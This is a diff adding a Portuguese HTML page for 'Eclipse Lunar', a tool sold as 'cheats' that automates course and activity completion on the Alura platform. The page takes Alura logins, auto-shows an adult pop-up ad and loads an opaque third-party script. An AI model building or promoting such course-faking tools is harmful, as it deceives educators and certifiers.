@@ -1,0 +1,1577 @@
+
+
+>
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');
+
+    .community-modal-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.85);
+        z-index: 9999;
+        align-items: center;
+        justify-content: center;
+        padding: 1rem;
+        overflow-y: auto;
+    }
+
+    .community-modal-overlay.active {
+        display: flex;
+    }
+
+    .community-modal {
+        max-width: 800px;
+        width: 100%;
+        background: #000000;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        position: relative;
+    }
+    .community-modal-header {
+        text-align: center;
+        margin-bottom: 2rem;
+    }
+
+    .community-modal-logo-wrapper {
+        width: 120px;
+        height: 120px;
+        margin: 0 auto 1rem;
+    }
+
+    .community-modal-logo {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+        filter: drop-shadow(0 0 10px rgba(139, 92, 246, 0.5));
+    }
+
+    .community-modal-title {
+        font-size: 2.5rem;
+        font-weight: 800;
+        background: linear-gradient(135deg, #8b5cf6, #ef4444);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        margin-bottom: 0.5rem;
+    }
+
+    .community-modal-subtitle {
+        color: #b0b0b0;
+        font-size: 1rem;
+        text-transform: uppercase;
+    }
+    .community-description {
+        text-align: center;
+        color: #d1d5db;
+        font-size: 1rem;
+        line-height: 1.6;
+        margin-bottom: 2rem;
+    }
+    .community-cards {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 1.5rem;
+        margin-bottom: 2rem;
+    }
+
+    .community-card {
+        background: linear-gradient(135deg, rgba(26, 26, 26, 0.9), rgba(10, 10, 10, 0.9));
+        border-radius: 16px;
+        padding: 1.5rem;
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+        cursor: pointer;
+    }
+
+    .community-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 10px 20px rgba(139, 92, 246, 0.2);
+    }
+
+    .community-card-header {
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        margin-bottom: 1rem;
+    }
+
+    .community-card-icon {
+        width: 50px;
+        height: 50px;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1.8rem;
+        color: #fff;
+    }
+
+    .discord-icon {
+        background: linear-gradient(135deg, #5865F2, #404EED);
+    }
+
+    .donation-icon {
+        background: linear-gradient(135deg, #ef4444, #dc2626);
+    }
+
+    .community-card-title {
+        font-size: 1.4rem;
+        font-weight: 700;
+        color: #fff;
+    }
+
+    .community-card-description {
+        font-size: 0.9rem;
+        color: #9ca3af;
+        line-height: 1.5;
+        margin-bottom: 1rem;
+    }
+
+    .community-card-link {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.5rem;
+        color: #fff;
+        background: #8b5cf6;
+        padding: 0.75rem 1.5rem;
+        border-radius: 8px;
+        text-decoration: none;
+        font-weight: 600;
+        transition: background 0.3s ease;
+    }
+
+    .community-card-link:hover {
+        background: #7c3aed;
+    }
+
+    .discord-card .community-card-link {
+        background: #5865F2;
+    }
+
+    .discord-card .community-card-link:hover {
+        background: #4752c4;
+    }
+
+    .donation-card .community-card-link {
+        background: #ef4444;
+    }
+
+    .donation-card .community-card-link:hover {
+        background: #dc2626;
+    }
+    .community-benefits {
+        background: rgba(139, 92, 246, 0.05);
+        border-radius: 12px;
+        padding: 1.5rem;
+        margin-bottom: 2rem;
+    }
+
+    .community-benefits-title {
+        font-size: 1.2rem;
+        font-weight: 700;
+        color: #8b5cf6;
+        margin-bottom: 1rem;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+    }
+
+    .community-benefits-list {
+        display: none;
+        grid-gap: 0.75rem;
+    }
+
+    .benefit-item {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        color: #e5e7eb;
+        font-size: 0.9rem;
+    }
+
+    .benefit-item i {
+        color: #8b5cf6;
+        font-size: 1.1rem;
+    }
+    .community-close-bottom {
+        display: block;
+        width: 100%;
+        padding: 1rem;
+        background: #ef4444;
+        color: #fff;
+        font-size: 1rem;
+        font-weight: 600;
+        border: none;
+        border-radius: 12px;
+        cursor: pointer;
+        transition: background 0.3s ease;
+    }
+
+    .community-close-bottom:hover {
+        background: #dc2626;
+    }
+    @media (max-width: 768px) {
+        .community-modal {
+            padding: 1.5rem;
+            border-radius: 16px;
+        }
+
+        .community-modal-logo-wrapper {
+            width: 100px;
+            height: 100px;
+        }
+
+        .community-modal-title {
+            font-size: 2rem;
+        }
+
+        .community-modal-subtitle {
+            font-size: 0.9rem;
+        }
+
+        .community-description {
+            font-size: 0.9rem;
+        }
+
+        .community-cards {
+            grid-template-columns: 1fr;
+            gap: 1rem;
+        }
+
+        .community-card {
+            padding: 1.25rem;
+        }
+
+        .community-card-icon {
+            width: 45px;
+            height: 45px;
+            font-size: 1.6rem;
+        }
+
+        .community-card-title {
+            font-size: 1.2rem;
+        }
+
+        .community-card-description {
+            font-size: 0.85rem;
+        }
+
+        .community-card-link {
+            padding: 0.6rem 1.2rem;
+            font-size: 0.9rem;
+        }
+
+        .community-benefits {
+            padding: 1.25rem;
+        }
+
+        .community-benefits-title {
+            font-size: 1.1rem;
+        }
+
+        .benefit-item {
+            font-size: 0.85rem;
+        }
+
+        .community-close-bottom {
+            padding: 0.8rem;
+            font-size: 0.9rem;
+        }
+    }
+
+    @media (max-width: 480px) {
+        .community-modal {
+            padding: 1rem;
+            border-radius: 12px;
+        }
+
+        .community-modal-logo-wrapper {
+            width: 80px;
+            height: 80px;
+        }
+
+        .community-modal-title {
+            font-size: 1.8rem;
+        }
+
+        .community-modal-subtitle {
+            font-size: 0.8rem;
+        }
+
+        .community-description {
+            font-size: 0.85rem;
+        }
+
+        .community-card {
+            padding: 1rem;
+        }
+
+        .community-card-icon {
+            width: 40px;
+            height: 40px;
+            font-size: 1.4rem;
+        }
+
+        .community-card-title {
+            font-size: 1.1rem;
+        }
+
+        .community-card-description {
+            font-size: 0.8rem;
+        }
+
+        .community-card-link {
+            padding: 0.5rem 1rem;
+            font-size: 0.85rem;
+        }
+
+        .community-benefits {
+            padding: 1rem;
+        }
+
+        .community-benefits-title {
+            font-size: 1rem;
+        }
+
+        .benefit-item {
+            font-size: 0.8rem;
+            gap: 0.5rem;
+        }
+
+        .benefit-item i {
+            font-size: 1rem;
+        }
+
+        .community-close-bottom {
+            padding: 0.7rem;
+            font-size: 0.85rem;
+        }
+    }
+</style>
+<div class="community-modal-overlay" id="communityModalOverlay">
+    <div class="community-modal">
+        <div class="community-modal-header">
+            <div class="community-modal-logo-wrapper">
+                <img src="https://crimsonzerohub.xyz/img/logo/eclipse.png" alt="Eclipse Lunar Logo" class="community-modal-logo">
+            </div>
+            <h2 class="community-modal-title">Junte-se à Comunidade</h2>
+            <p class="community-modal-subtitle">Eclipse Lunar</p>
+        </div>
+
+        <div class="community-modal-body">
+            <p class="community-description">
+                Conecte-se com milhares de estudantes, receba suporte exclusivo e ajude a manter o Eclipse Lunar sempre evoluindo!
+            </p>
+
+            <div class="community-cards">
+                <div class="community-card discord-card" onclick="window.open('https://discord.com/invite/zRXgHF9hrQ', '_blank')">
+                    <div class="community-card-header">
+                        <div class="community-card-icon discord-icon">
+                            <i class="fab fa-discord"></i>
+                        </div>
+                        <h3 class="community-card-title">Discord Community</h3>
+                    </div>
+                    <p class="community-card-description">
+                        Entre no servidor oficial! Suporte técnico 24/7 e atualizações em primeira mão.
+                    </p>
+                    <a href="https://discord.com/invite/zRXgHF9hrQ" target="_blank" class="community-card-link" onclick="event.stopPropagation()">
+                        <i class="fab fa-discord"></i> Entrar no Discord <i class="fas fa-arrow-right"></i>
+                    </a>
+                </div>
+                <div class="community-card donation-card" onclick="window.open('https://pixgg.com/Crimsonstrauss', '_blank')">
+                    <div class="community-card-header">
+                        <div class="community-card-icon donation-icon">
+                            <i class="fas fa-heart"></i>
+                        </div>
+                        <h3 class="community-card-title">Apoie o Projeto</h3>
+                    </div>
+                    <p class="community-card-description">
+                        Contribua para manter a plataforma gratuita, rápida e em constante evolução. Sua doação faz a diferença!
+                    </p>
+                    <a href="https://pixgg.com/Crimsonstrauss" target="_blank" class="community-card-link" onclick="event.stopPropagation()">
+                        <i class="fas fa-heart"></i> Fazer Doação <i class="fas fa-arrow-right"></i>
+                    </a>
+                </div>
+            </div>
+
+            <div class="community-benefits" id="communityBenefits">
+                <div class="community-benefits-title" id="benefitsToggle">
+                    <i class="fas fa-chevron-down"></i> Por que fazer parte?
+                </div>
+                <div class="community-benefits-list" id="benefitsList">
+                    <div class="benefit-item">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Suporte prioritário e resolução rápida de problemas</span>
+                    </div>
+                    <div class="benefit-item">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Acesso antecipado a novas funcionalidades e ferramentas</span>
+                    </div>
+                    <div class="benefit-item">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Dicas exclusivas e tutoriais. </span>
+                    </div>
+                </div>
+            </div>
+
+            <button class="community-close-bottom" id="communityCloseBottom">Fechar</button>
+        </div>
+    </div>
+</div>
+<script>
+    (function() {
+        'use strict';
+
+        const shouldShow = false;
+        const overlay = document.getElementById('communityModalOverlay');
+        const benefitsToggle = document.getElementById('benefitsToggle');
+        const benefitsList = document.getElementById('benefitsList');
+        const closeBtn = document.getElementById('communityCloseBottom');
+        if (shouldShow && overlay) {
+            setTimeout(() => {
+                overlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            }, 2000);
+        }
+        function closeModal() {
+            if (overlay) {
+                overlay.classList.remove('active');
+                document.body.style.overflow = '';
+            }
+        }
+        if (benefitsToggle) {
+            benefitsToggle.addEventListener('click', () => {
+                if (benefitsList.style.display === 'grid') {
+                    benefitsList.style.display = 'none';
+                    benefitsToggle.querySelector('i').classList.remove('fa-chevron-up');
+                    benefitsToggle.querySelector('i').classList.add('fa-chevron-down');
+                } else {
+                    benefitsList.style.display = 'grid';
+                    benefitsToggle.querySelector('i').classList.remove('fa-chevron-down');
+                    benefitsToggle.querySelector('i').classList.add('fa-chevron-up');
+                }
+            });
+        }
+        if (closeBtn) {
+            closeBtn.addEventListener('click', closeModal);
+        }
+
+        if (overlay) {
+            overlay.addEventListener('click', (e) => {
+                if (e.target === overlay) {
+                    closeModal();
+                }
+            });
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape' && overlay.classList.contains('active')) {
+                    closeModal();
+                }
+            });
+        }
+    })();
+</script><style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+    .hentai-notification-wrapper {
+        position: fixed;
+        top: 20px;
+        left: 20px;
+        z-index: 999999;
+        pointer-events: none;
+    }
+
+    .hentai-notify {
+        display: none;
+        width: 320px;
+        background: linear-gradient(135deg, #1a0000 0%, #4a0000 50%, #1a0000 100%);
+        border-radius: 12px;
+        padding: 16px;
+        box-shadow: 0 4px 20px rgba(220, 38, 38, 0.3), 0 0 0 1px rgba(220, 38, 38, 0.2);
+        animation: slideInLeft 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        cursor: pointer;
+        transition: all 0.3s ease;
+        font-family: 'Inter', sans-serif;
+        pointer-events: auto;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .hentai-notify.active {
+        display: block;
+    }
+
+    .hentai-notify:hover {
+        transform: translateX(4px);
+        box-shadow: 0 6px 25px rgba(220, 38, 38, 0.4), 0 0 0 1px rgba(220, 38, 38, 0.3);
+    }
+
+    @keyframes slideInLeft {
+        from {
+            transform: translateX(-350px);
+            opacity: 0;
+        }
+        to {
+            transform: translateX(0);
+            opacity: 1;
+        }
+    }
+
+    .hentai-notify::before {
+        content: '';
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 4px;
+        height: 100%;
+        background: linear-gradient(180deg, #dc2626, #ef4444);
+    }
+
+    .hentai-notify-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 8px;
+    }
+
+    .hentai-notify-brand {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .hentai-notify-icon {
+        font-size: 20px;
+    }
+
+    .hentai-notify-title {
+        font-size: 14px;
+        font-weight: 600;
+        color: #ef4444;
+        letter-spacing: 0.3px;
+    }
+
+    .hentai-notify-badge {
+        background: rgba(220, 38, 38, 0.2);
+        color: #f87171;
+        font-size: 10px;
+        font-weight: 700;
+        padding: 2px 8px;
+        border-radius: 4px;
+        border: 1px solid rgba(220, 38, 38, 0.3);
+        letter-spacing: 0.5px;
+    }
+
+    .hentai-notify-content {
+        margin-bottom: 10px;
+    }
+
+    .hentai-notify-text {
+        font-size: 13px;
+        color: rgba(255, 255, 255, 0.85);
+        line-height: 1.4;
+        margin-bottom: 6px;
+    }
+
+    .hentai-notify-url {
+        font-size: 12px;
+        color: #ef4444;
+        font-weight: 500;
+        display: flex;
+        align-items: center;
+        gap: 4px;
+    }
+
+    .hentai-notify-url i {
+        font-size: 10px;
+    }
+
+    .hentai-notify-close {
+        position: absolute;
+        top: 8px;
+        right: 8px;
+        background: rgba(0, 0, 0, 0.3);
+        color: rgba(255, 255, 255, 0.5);
+        border: none;
+        width: 20px;
+        height: 20px;
+        border-radius: 4px;
+        font-size: 12px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: all 0.2s ease;
+        opacity: 0;
+    }
+
+    .hentai-notify:hover .hentai-notify-close {
+        opacity: 1;
+    }
+
+    .hentai-notify-close:hover {
+        background: rgba(0, 0, 0, 0.5);
+        color: #fff;
+    }
+
+    @media (max-width: 768px) {
+        .hentai-notification-wrapper {
+            top: 10px;
+            left: 10px;
+            right: 10px;
+        }
+
+        .hentai-notify {
+            width: 100%;
+            max-width: 340px;
+            padding: 14px;
+        }
+
+        .hentai-notify-icon {
+            font-size: 18px;
+        }
+
+        .hentai-notify-title {
+            font-size: 13px;
+        }
+
+        .hentai-notify-text {
+            font-size: 12px;
+        }
+
+        .hentai-notify-url {
+            font-size: 11px;
+        }
+    }
+
+    @media (max-width: 480px) {
+        .hentai-notify {
+            width: calc(100vw - 20px);
+            max-width: none;
+        }
+    }
+
+    @keyframes slideOutLeft {
+        from {
+            transform: translateX(0);
+            opacity: 1;
+        }
+        to {
+            transform: translateX(-350px);
+            opacity: 0;
+        }
+    }
+</style>
+<div class="hentai-notification-wrapper">
+    <div class="hentai-notify" id="hentaiNotify">
+        <button class="hentai-notify-close" id="hentaiNotifyClose" onclick="event.stopPropagation()">
+            <i class="fas fa-times"></i>
+        </button>
+        
+        <div class="hentai-notify-header">
+            <div class="hentai-notify-brand">
+                <span class="hentai-notify-icon">🔞</span>
+                <span class="hentai-notify-title">Ilusion Hentai</span>
+            </div>
+            <span class="hentai-notify-badge">+18</span>
+        </div>
+        
+        <div class="hentai-notify-content">
+            <p class="hentai-notify-text">
+                Conteúdo exclusivo atualizado diariamente
+            </p>
+            <div class="hentai-notify-url">
+                <span>ilusionhentai.xyz</span>
+                <i class="fas fa-external-link-alt"></i>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    (function() {
+        'use strict';
+
+        const shouldShow = true;
+        const delayTime = 3000;
+        const notification = document.getElementById('hentaiNotify');
+        const closeBtn = document.getElementById('hentaiNotifyClose');
+
+        if (shouldShow && notification) {
+            setTimeout(() => {
+                notification.classList.add('active');
+            }, delayTime);
+        }
+
+        function closeNotification() {
+            if (notification) {
+                notification.style.animation = 'slideOutLeft 0.3s ease';
+                setTimeout(() => {
+                    notification.classList.remove('active');
+                    notification.style.animation = '';
+                }, 300);
+            }
+        }
+
+        if (notification) {
+            notification.addEventListener('click', () => {
+                window.open('https://ilusionhentai.xyz', '_blank');
+                closeNotification();
+            });
+        }
+
+        if (closeBtn) {
+            closeBtn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                closeNotification();
+            });
+        }
+
+        if (shouldShow) {
+            setTimeout(() => {
+                closeNotification();
+            }, 20000);
+        }
+    })();
+</script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script type='text/javascript' src='//smithburka.com/41/fb/f1/41fbf111e2dc5df96413742e3444fa90.js'></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cheats Alura – Automação de Cursos | Eclipse Lunar</title>
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="Cheats para Alura com automação de cursos e atividades. Acelere seu progresso com o Eclipse Lunar.">
+    <meta name="author" content="crimsonstrauss">
+
+    
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" rel="stylesheet"/>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+       
+        :root {
+            --primary-purple: rgb(220, 20, 60); 
+            --dark-purple: #DC2626;            
+            --light-purple: rgb(243, 116, 116);
+            --light-purple-bg: rgba(76, 16, 214, 0.1);
+            --background-dark: #000000;
+            --background-medium: #1a1a1a;
+            --background-light: #2d2d2d;
+            --text-primary: #ffffff;
+            --text-secondary: #b0b0b0;
+            --border-color: rgba(255, 255, 255, 0.1);
+            --success-color: #10b981;
+            --warning-color: #f59e0b;
+            --error-color: #ef4444;
+            --delete-color: #be123c;
+            --delete-color-hover: #9f1239;
+            --completed-purple: #8b5cf6;
+            --completed-blue: #3b82f6;
+            --alura-warning: rgb(255, 7, 7);
+        }
+       
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+       
+        .main-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            width: 100%;
+            padding: 1rem;
+            gap: 1rem;
+            min-height: 100vh;
+        }
+        
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 420px;
+        }
+        
+        @media (min-width: 1200px) {
+            .main-content {
+                max-width: 480px;
+            }
+        }
+       
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--background-dark);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-image:
+                radial-gradient(circle at 20% 80%, rgba(139, 92, 246, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(45, 45, 45, 0.3) 0%, transparent 50%),
+                linear-gradient(135deg, #000000 0%, #0a0a0a 50%, #141414 100%);
+        }
+       
+        .login-container { 
+            width: 100%; 
+            max-width: 380px; 
+            padding: 2rem; 
+            margin: 0; 
+        }
+        
+        .header { text-align: center; margin-bottom: 2rem; }
+        .logo-section { display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; }
+        .logo-text { font-size: 2.5rem; font-weight: 500; background: linear-gradient(135deg, var(--primary-purple), var(--dark-purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .subtitle { color: var(--text-secondary); font-weight: 400; margin-bottom: 0.5rem; }
+        .tagline { font-size: 0.8rem; font-weight: 700; color: var(--primary-purple); letter-spacing: 0.1em; text-transform: uppercase; }
+        .form { display: flex; flex-direction: column; gap: 1.5rem; }
+        .input-group { position: relative; }
+        .input-group label { display: block; font-size: 0.9rem; font-weight: 400; color: var(--text-secondary); margin-bottom: 0.5rem; }
+        .input-wrapper { position: relative; }
+        .input-group input { width: 100%; padding: 0.75rem 1rem; background: transparent; border: 1px solid var(--border-color); border-radius: 8px; color: var(--text-primary); font-size: 1rem; transition: all 0.3s ease; font-family: 'Poppins', sans-serif; }
+        .input-group input[type="password"] { padding-right: 2.5rem; }
+        .input-group input:focus { outline: none; border-color: var(--primary-purple); box-shadow: 0 0 0 2px rgba(207, 16, 16, 0.2); }
+        .password-toggle { position: absolute; right: 0.75rem; top: 50%; transform: translateY(-50%); background: none; border: none; color: var(--text-secondary); cursor: pointer; padding: 0.25rem; transition: color 0.2s ease; }
+        .password-toggle:hover { color: var(--text-primary); }
+        .form-buttons { display: flex; flex-direction: column; gap: 0.75rem; margin-top: 1.5rem; }
+        .btn { width: 100%; padding: 0.75rem; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: all 0.3s ease; border: none; font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; gap: 0.5rem; }
+        .btn-accounts { margin-bottom: 1.5rem; background: var(--primary-purple); border: 1px solid var(--border-color); color: var(--text-primary); }
+        .btn-accounts:hover { background: var(--light-purple); border-color: var(--light-purple); }
+        .btn-main { background: linear-gradient(135deg, rgb(10, 10, 10), #252525, var(--primary-purple)); color: var(--text-primary); border: 1px solid var(--border-color); }
+        .btn-main:hover:not(:disabled) { background: linear-gradient(135deg, rgb(17, 17, 17), #252525, var(--dark-purple)); transform: translateY(-1px); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
+        .footer { text-align: center; margin-top: 3rem; padding-top: 1.5rem; border-top: 1px solid var(--border-color); }
+        .footer-links { display: flex; justify-content: center; gap: 1.5rem; margin-bottom: 1rem; }
+        .footer-links a { color: var(--text-secondary); text-decoration: none; font-weight: 500; font-size: 0.9rem; transition: color 0.2s ease; display: flex; align-items: center; gap: 0.4rem; }
+        .footer-links a:hover { color: var(--text-primary); }
+        .copyright { font-size: 0.75rem; color: rgba(255, 255, 255, 0.5); }
+        
+        .modal { 
+            display: none; 
+            position: fixed; 
+            z-index: 1000; 
+            left: 0; 
+            top: 0; 
+            width: 100%; 
+            height: 100%; 
+            background-color: rgba(0, 0, 0, 0.8); 
+            backdrop-filter: blur(5px); 
+            align-items: center; 
+            justify-content: center; 
+            padding: 1rem; 
+        }
+        .modal.show { display: flex; }
+        .modal-content { 
+            position: relative; 
+            background: linear-gradient(145deg, #1a1a1a, #21113b); 
+            border-radius: 16px; 
+            width: 100%; 
+            max-width: 600px; 
+            max-height: 90vh; 
+            border: 1px solid var(--primary-purple); 
+            box-shadow: 0 20px 60px rgba(205, 37, 18, 0.3); 
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column; 
+        }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; padding: 1.5rem 2rem; border-bottom: 1px solid var(--primary-purple); }
+        .modal-header h2 { font-size: 1.5rem; font-weight: 600; }
+        .modal-body { flex: 1; overflow-y: auto; padding: 2rem; }
+        .close-btn { background: none; border: none; color: var(--text-secondary); font-size: 1.5rem; cursor: pointer; transition: all 0.2s ease; }
+        .close-btn:hover { color: var(--text-primary); transform: scale(1.1); }
+        .account-list { display: flex; flex-direction: column; gap: 1rem; }
+        .account-list-item { display: flex; justify-content: space-between; align-items: center; padding: 1rem; background: var(--light-purple-bg); border-radius: 8px; border: 1px solid var(--border-color); }
+        .account-list-item-user { font-weight: 500; word-break: break-all; }
+        .account-list-item-actions { display: flex; gap: 0.75rem; }
+        .btn-account-action { padding: 0.4rem 0.8rem; border: none; border-radius: 6px; cursor: pointer; font-weight: 500; transition: all 0.2s ease; }
+        .btn-use { background: var(--primary-purple); color: white; }
+        .btn-use:hover { background: var(--dark-purple); }
+        .btn-delete { background: var(--delete-color); color: white; }
+        .btn-delete:hover { background: var(--delete-color-hover); }
+        
+        .confirmation-text { margin-bottom: 1.5rem; text-align: center; line-height: 1.6; }
+        .modal-actions { display: flex; gap: 1rem; justify-content: center; }
+        #notificationsContainer {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 2000;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-width: 320px;
+        }
+        .notification {
+            background: var(--background-medium);
+            border-left: 4px solid;
+            padding: 0.8rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.4s ease;
+            min-width: 250px;
+            max-width: 320px;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+        .notification.show { opacity: 1; transform: translateY(0); }
+        .notification h3 {
+            margin: 0 0 4px 0;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        .notification p {
+            margin: 0;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            line-height: 1.3;
+            max-height: 60px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .notification.success { border-color: var(--success-color); }
+        .notification.error { border-color: var(--error-color); }
+        .notification.info { border-color: var(--primary-purple); }
+        .notification.warning { border-color: var(--warning-color); }
+        .config-section { margin-bottom: 1.5rem; }
+        .config-section h3 { margin-bottom: 1rem; font-size: 1.2rem; color: var(--primary-purple); }
+        .time-inputs { display: flex; gap: 1rem; margin-bottom: 1rem; }
+        .time-inputs .input-group { flex: 1; }
+        .checkbox-container { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 1rem; }
+        .checkbox-container input[type="checkbox"] { width: auto; }
+        .checkbox-container label { margin: 0; cursor: pointer; }
+        #progressBarContainer { width: 100%; background: var(--background-light); border-radius: 8px; overflow: hidden; margin: 1rem 0; }
+        #progressBarFill { width: 0%; height: 20px; background: linear-gradient(90deg, var(--primary-purple), var(--dark-purple)); transition: width 0.3s ease-in-out; }
+        #progressText { text-align: center; font-weight: 500; margin-top: 0.5rem; }
+        #stopProcessBtn {
+            display: block;
+            margin: 1rem auto 0;
+            padding: 0.5rem 1.5rem;
+            background: var(--error-color);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            min-width: 120px;
+        }
+        #stopProcessBtn:hover:not(:disabled) {
+            background: #dc2626;
+            transform: translateY(-1px);
+        }
+        #stopProcessBtn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        @media (max-width: 480px) {
+            .login-container { padding: 1.5rem; }
+            #notificationsContainer { left: 50%; transform: translateX(-50%); width: 90%; }
+            .time-inputs { flex-direction: column; }
+            .main-wrapper { padding: 0.5rem; gap: 0.5rem; }
+            .main-content { max-width: 100%; }
+            .logo-text { font-size: 2rem; }
+        }
+        #courseSelectionModal .modal-content {
+            position: relative;
+            background: linear-gradient(145deg, #1a1a1a, #21113b);
+            border-radius: 16px;
+            width: 100%;
+            max-width: 600px;
+            max-height: 90vh;
+            border: 1px solid var(--primary-purple);
+            box-shadow: 0 20px 60px rgba(237, 58, 58, 0.3);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+       
+        #courseSelectionModal .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 1.5rem;
+            border-bottom: 1px solid var(--primary-purple);
+            background: rgba(76, 16, 214, 0.05);
+        }
+       
+        #courseSelectionModal .modal-header h2 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin: 0;
+        }
+       
+        #courseSelectionModal .close-btn {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 1.3rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+       
+        #courseSelectionModal .close-btn:hover {
+            color: var(--text-primary);
+            transform: scale(1.1);
+        }
+       
+        #courseSelectionModal .modal-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 1.5rem;
+        }
+       
+        #courseSelectionModal .course-items {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+            max-height: 300px;
+            overflow-y: auto;
+            margin-bottom: 1.5rem;
+            padding-right: 10px; 
+        }
+        #courseSelectionModal .course-items::-webkit-scrollbar {
+          width: 8px;
+        }
+        #courseSelectionModal .course-items::-webkit-scrollbar-track {
+          background: var(--background-light);
+          border-radius: 10px;
+        }
+        #courseSelectionModal .course-items::-webkit-scrollbar-thumb {
+          background: var(--primary-purple);
+          border-radius: 10px;
+        }
+        #courseSelectionModal .course-items::-webkit-scrollbar-thumb:hover {
+          background: var(--dark-purple);
+        }
+
+       
+        #courseSelectionModal .course-item {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+       
+        #courseSelectionModal .course-item:hover {
+            background: rgba(76, 16, 214, 0.08);
+            border-color: var(--primary-purple);
+        }
+       
+        #courseSelectionModal .course-item input[type="radio"] {
+            -webkit-appearance: none;
+            appearance: none;
+            background-color: transparent;
+            margin: 0;
+            font: inherit;
+            color: var(--border-color);
+            width: 1.15em;
+            height: 1.15em;
+            border: 0.15em solid currentColor;
+            border-radius: 50%;
+            transform: translateY(-0.075em);
+            display: grid;
+            place-content: center;
+        }
+
+        #courseSelectionModal .course-item input[type="radio"]::before {
+            content: "";
+            width: 0.65em;
+            height: 0.65em;
+            border-radius: 50%;
+            transform: scale(0);
+            transition: 120ms transform ease-in-out;
+            box-shadow: inset 1em 1em var(--primary-purple);
+        }
+
+        #courseSelectionModal .course-item input[type="radio"]:checked::before {
+            transform: scale(1);
+        }
+
+        #courseSelectionModal .course-item input[type="radio"]:focus {
+            outline: max(2px, 0.15em) solid var(--primary-purple);
+            outline-offset: max(2px, 0.15em);
+        }
+
+       
+        #courseSelectionModal .course-item label {
+            flex: 1;
+            cursor: pointer;
+            color: var(--text-primary);
+            font-weight: 400;
+        }
+
+        #courseSelectionModal .course-item.completed {
+            opacity: 0.6;
+            cursor: not-allowed;
+            background: rgba(255, 255, 255, 0.01);
+        }
+         #courseSelectionModal .course-item.completed label {
+            text-decoration: line-through;
+            color: var(--text-secondary);
+        }
+       
+        #courseSelectionModal .time-settings {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
